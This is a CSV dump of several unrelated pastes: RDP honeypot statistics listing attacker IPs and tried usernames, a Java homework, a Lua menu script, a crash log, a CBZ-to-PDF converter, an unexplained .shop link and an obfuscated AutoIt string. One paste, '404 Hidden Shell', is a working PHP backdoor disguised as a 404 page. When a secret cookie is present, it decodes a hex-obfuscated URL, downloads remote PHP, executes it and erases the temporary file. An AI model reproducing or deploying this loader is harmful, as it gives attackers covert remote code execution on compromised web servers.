id,title,username,language,date,content
Es20TZUF,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:18:19 PM CDT,"{
  ""ip"": {
    ""165.232.170.129"": 41709,
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62778,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62778,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62763,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""South West"": 54240,
    ""New Jersey"": 8538,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""Singapore"": 54243,
    ""United States"": 8592,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63063,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63186
  },
  ""client_build"": {
    ""Unknown"": 63186
  },
  ""client_name"": {
    ""Unknown"": 63186
  },
  ""ip_type"": {
    ""hosting"": 62856,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
HJ24vp0K,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""165.232.170.129"": 41707,
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62776,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62776,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62761,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""South West"": 54238,
    ""New Jersey"": 8538,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""Singapore"": 54241,
    ""United States"": 8592,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63061,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63184
  },
  ""client_build"": {
    ""Unknown"": 63184
  },
  ""client_name"": {
    ""Unknown"": 63184
  },
  ""ip_type"": {
    ""hosting"": 62854,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
xUL6iqvH,2025-06-07_stats.json,rdp_snitch,JSON,Sunday 8th of June 2025 07:15:12 PM CDT,"{
  ""ip"": {
    ""165.232.170.129"": 41705,
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62774,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62774,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62759,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""South West"": 54236,
    ""New Jersey"": 8538,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""Singapore"": 54239,
    ""United States"": 8592,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63059,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63182
  },
  ""client_build"": {
    ""Unknown"": 63182
  },
  ""client_name"": {
    ""Unknown"": 63182
  },
  ""ip_type"": {
    ""hosting"": 62852,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
TideJi6m,GeoWealth Homework,Petrov4o,Java,Sunday 8th of June 2025 06:59:07 PM CDT,"import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.*;
import java.util.stream.Collectors;

public class WordReducer
{
    private static final String WORDS_URL = ""https://raw.githubusercontent.com/nikiiv/JavaCodingTestOne/master/scrabble-words.txt"";
    private static final Set<String> VALID_ONE_LETTER_WORDS = Set.of(""I"", ""A"");

    private Set<String> dictionary;

    public static void main(String[] args) throws Exception
    {
        WordReducer reducer = new WordReducer();
        reducer.populateDictionary();

        System.out.println(""Dictionary loaded with "" + reducer.dictionary.size() + "" words.\n"");

        List<String> allNineLetterWords = reducer.dictionary.stream()
                .filter(w -> w.length() == 9)
                .toList();

        for (String word : allNineLetterWords)
        {
            List<String> chain = reducer.findSubWordChainBFS(word);
            if (chain != null)
            {
                System.out.println(""Chain found: "" + chain);
            }
        }
    }

    public void populateDictionary() throws Exception
    {
        URL url = new URL(WORDS_URL);
        try (BufferedReader br = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream())))
        {
            dictionary = br.lines()
                    .skip(1)
                    .map(String::trim)
                    .filter(line -> !line.isEmpty())
                    .map(String::toUpperCase)
                    .filter(word -> word.length() != 1 || VALID_ONE_LETTER_WORDS.contains(word))
                    .collect(Collectors.toSet());
        }
        dictionary.add(""I"");
        dictionary.add(""A"");
    }

    public List<String> AllSubWordsFromWord(String word)
    {
        List<String> subWords = new ArrayList<>();
        for (int i = 0; i < word.length(); i++)
        {
            String sub = word.substring(0, i) + word.substring(i + 1);
            subWords.add(sub);
        }
        subWords.removeIf(String::isEmpty);
        return subWords.stream().distinct().collect(Collectors.toList());
    }

    public List<String> findSubWordChainBFS(String startWord)
    {
        if (!dictionary.contains(startWord))
        {
            return null;
        }

        Queue<List<String>> queue = new LinkedList<>();
        queue.add(List.of(startWord));

        Set<String> visited = new HashSet<>();
        visited.add(startWord);

        while (!queue.isEmpty())
        {
            List<String> currentChain = queue.poll();
            String currentWord = currentChain.get(currentChain.size() - 1);

            if (currentWord.length() == 1 && VALID_ONE_LETTER_WORDS.contains(currentWord))
            {
                return currentChain;
            }

            List<String> validSubWords = AllSubWordsFromWord(currentWord).stream()
                    .map(String::toUpperCase)
                    .filter(dictionary::contains)
                    .filter(word -> !visited.contains(word))
                    .toList();

            for (String subWord : validSubWords)
            {
                List<String> newChain = new ArrayList<>(currentChain);
                newChain.add(subWord);
                queue.add(newChain);
                visited.add(subWord);
            }
        }
        return null;
    }
}
"
SUQGEyDh,404 Hidden Shell,willysec_id,PHP,Sunday 8th of June 2025 06:56:08 PM CDT,"<?php
@ini_set('display_errors',0);
function _x7k9p($s){
    $r='';
    for($i=0;$i<strlen($s);$i+=2){
        $r.=chr(hexdec(substr($s,$i,2)));
    }
    return $r;
}
function _z3m5q($u){
    if(function_exists('curl_exec')){
        $c=curl_init($u);
        curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0]);
        $r=curl_exec($c);
        curl_close($c);
        return $r;
    }
    return false;
}
function _y4n2j(){
    $a=_x7k9p('6c757368');
    return isset($_COOKIE[$a])&&$_COOKIE[$a]===_x7k9p('666c61766f72');
}
if(_y4n2j()){
    $u=_x7k9p('68747470733a2f2f')._x7k9p('7261772e67697468756275736572636f6e74656e742e636f6d2f64616e313538342f617366646173').'/'._x7k9p('726566732f68656164732f6d61696e2f6173772e706870');
    $d=_z3m5q($u);
    if($d!==false){
        $randDir='/tmp/tmp_'.uniqid().'_'.rand(1000,9999);
        $randFile=$randDir.'/temp_'.md5(uniqid()).'.'.strtolower('php');
        mkdir($randDir, 0775, true);
        call_user_func(_x7k9p('66696c655f7075745f636f6e74656e7473'), $randFile, $d);
        include $randFile;
        unlink($randFile);
        rmdir($randDir);
    }
    else{
        echo '?'.$u;
    }
    exit;
}
?><!DOCTYPE html><html><head><title>404 Not Found</title><meta name=""robots"" content=""noindex,nofollow""><style>html,body{margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{font-family:sans-serif}iframe{position:absolute;top:0;left:0;border:none;width:100%;height:100%}</style></head><body><iframe src=""//<?php echo $_SERVER['SERVER_NAME']; ?>/404"" id=""iframe_id"" onload=""document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;""></iframe></body></html>"
XUrqYsv5,OS - Startup,Rukerisu,Lua,Sunday 8th of June 2025 06:45:22 PM CDT,"-- Compzter Craft OS - Scrollable Menu

local options = {""Programs"", ""Files"", ""Shutdown"", ""Uninstall""}
local selected = 1

function clearScreen()
    term.clear()
    term.setCursorPos(1, 1)
end

function drawMenu()
    clearScreen()
    print(""=== Compzter Craft OS ===\n"")
    for i, option in ipairs(options) do
        if i == selected then
            print(""> "" .. option)
        else
            print(""  "" .. option)
        end
    end
    print(""\nUse W/S to move, Enter to select."")
end

function listPrograms()
    clearScreen()
    print(""=== Programs ===\n"")
    local programs = fs.list(""programs"")
    if #programs == 0 then
        print(""No programs found."")
    else
        for i, name in ipairs(programs) do
            print(i .. "". "" .. name)
        end
        print(""\nType number to run program or press Enter to go back:"")
        write(""> "")
        local choice = read()
        local index = tonumber(choice)
        if index and programs[index] then
            shell.run(""programs/"" .. programs[index])
        end
    end
    print(""\nPress any key to return..."")
    os.pullEvent(""key"")
end

function browseFiles()
    clearScreen()
    print(""=== Files ===\n"")
    shell.run(""ls"")
    print(""\nPress any key to return..."")
    os.pullEvent(""key"")
end

function shutdownOS()
    clearScreen()
    print(""Shutting down..."")
    sleep(1)
    os.shutdown()
end

function uninstallOS()
    clearScreen()
    print(""Are you sure you want to uninstall the OS? (yes/no)"")
    write(""> "")
    local confirm = read()
    if confirm == ""yes"" then
        fs.delete(""startup"")
        fs.delete(""programs"")
        print(""OS uninstalled. Rebooting..."")
        sleep(2)
        os.reboot()
    else
        print(""Uninstall cancelled."")
        sleep(1)
    end
end

function handleSelection()
    if selected == 1 then
        listPrograms()
    elseif selected == 2 then
        browseFiles()
    elseif selected == 3 then
        shutdownOS()
    elseif selected == 4 then
        uninstallOS()
    end
end

-- Main loop
while true do
    drawMenu()
    local event, key = os.pullEvent(""key"")
    if key == keys.w then
        selected = selected - 1
        if selected < 1 then selected = #options end
    elseif key == keys.s then
        selected = selected + 1
        if selected > #options then selected = 1 end
    elseif key == keys.enter then
        handleSelection()
    end
end
"
nBZXQHMA,Untitled,Nobodyking,Bash,Sunday 8th of June 2025 05:58:31 PM CDT,http://sub35nj7kmmlk.shop/
yh2d6KDL,Untitled,TakePen,AutoIt,Sunday 8th of June 2025 05:19:45 PM CDT,vtPo3hYnhlm7nnVBp4quqqqqqq#zfgsrP07HwrHPHbcWwWsrP07Hwr11bcWwWsrP07Hwrxg1elbBbp2rwHPTbt9KvKFyFeeeep2rHb58qq#ygbPTd9
Vm5j6pHB,2025-06-08T23:38:43.104,powerampache,PHP,Sunday 8th of June 2025 04:38:44 PM CDT,"1.00-69 (69) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
c8jkbfjd,CBZ to PDF converter,RedstoneHair,Python,Sunday 8th of June 2025 04:26:18 PM CDT,"import os
import sys
import zipfile
import shutil
from PIL import Image
from PyPDF2 import PdfMerger
from slashr import SlashR

sr = None

DIR = """" or (
	sys.argv[1] 
	if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]) 
	else input(""Directory: "")
)

def progress(done: int, total: int):
    sr.print(f""{done} / {total}"")

def handle_file(path):
    if not path.lower().endswith("".cbz""):
        return
    print(f""PROCESS {os.path.basename(path)}"")
    temp_dir = os.path.join(DIR, ""temp"")
    pdf_dir = os.path.join(DIR, ""temp_pdfs"")
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    if os.path.exists(pdf_dir):
        shutil.rmtree(pdf_dir)
    os.makedirs(temp_dir)
    os.makedirs(pdf_dir)
    with zipfile.ZipFile(path, 'r') as zip_ref:
        file_list = zip_ref.namelist()
        total_steps = len(file_list) * 2 + 1
        for i, file in enumerate(file_list):
            zip_ref.extract(file, temp_dir)
            progress(i + 1, total_steps)
    images = sorted([
        os.path.join(temp_dir, f)
        for f in os.listdir(temp_dir)
        if f.lower().endswith(("".png"", "".jpg"", "".jpeg"", "".bmp"", "".webp""))
    ])
    if images:
        pdf_paths = []
        for i, img_path in enumerate(images):
            pdf_path = os.path.join(pdf_dir, f""{i}.pdf"")
            img = Image.open(img_path).convert(""RGB"")
            img.save(pdf_path, ""PDF"", resolution=100.0)
            img.close()
            pdf_paths.append(pdf_path)
            progress(len(file_list) + i + 1, total_steps)
        merger = PdfMerger()
        for pdf in pdf_paths:
            merger.append(pdf)
        out_path = os.path.splitext(path)[0] + "".pdf""
        merger.write(out_path)
        merger.close()
        progress(total_steps - 1, total_steps)
    shutil.rmtree(temp_dir)
    shutil.rmtree(pdf_dir)
    progress(total_steps, total_steps)

def main():
    global sr
    for file in os.listdir(DIR):
        path = os.path.join(DIR, file)
        if os.path.isfile(path):
            with SlashR() as sr:
                handle_file(path)

if __name__ == ""__main__"":
    main()
"
